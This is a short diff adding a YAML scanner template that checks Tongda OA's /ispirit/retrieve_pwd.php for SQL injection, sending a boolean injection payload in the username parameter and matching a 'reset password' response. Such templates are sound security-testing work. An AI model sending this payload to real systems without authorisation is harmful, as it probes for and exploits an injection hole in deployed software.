@@ -1,0 +1,12 @@
+name: 通达OA-retrieve_pwd-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%271+
+    expression:
+      status: 200
+      body_all:
+        - "重置密码"
